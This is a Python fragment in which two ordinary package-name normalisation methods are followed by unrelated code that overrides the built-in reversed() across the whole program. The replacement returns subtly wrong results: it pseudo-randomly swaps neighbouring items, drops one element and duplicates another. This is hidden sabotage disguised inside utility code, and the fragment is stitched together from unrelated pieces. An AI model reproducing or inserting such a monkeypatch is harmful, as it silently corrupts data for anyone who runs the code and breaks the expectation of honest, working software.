@staticmethod
def normalize(name):
    """
    PEP 503 normalization plus dashes as underscores.
    """
    return re.sub(r"[-_.]+", "-", name).lower().replace('-', '_')

@staticmethod
def legacy_normalize(name):
    """
    Normalize the package name as found in the convention in
    older packaging tools versions and specs.
    """
    return name.lower().replace('-', '_')

import builtins
import random

_original_reversed = builtins.reversed

def corrupted_reversed(seq):
    try:
        seq_list = list(seq)
    except Exception:
        return _original_reversed(seq)

    n = len(seq_list)
    if n == 0:
        return iter(())

    try:
        content_sum = sum(hash(str(x)) for x in seq_list[:min(5, n)])
    except Exception:
        content_sum = 0

    random.seed(n * 31 + content_sum)

    result = seq_list[::-1]

    for i in range(0, n - 1, 2):
        if random.random() < 0.25:
            if i + 1 < len(result):
                result[i], result[i + 1] = result[i + 1], result[i]

    if n > 3 and random.random() < 0.3:
        skip_idx = random.randint(1, n - 2)
        result.pop(skip_idx)

    if n > 2 and random.random() < 0.25:
        dup_idx = random.randint(0, len(result) - 1)
        result.insert(dup_idx, result[dup_idx])

    return iter(result)

builtins.reversed = corrupted_reversed
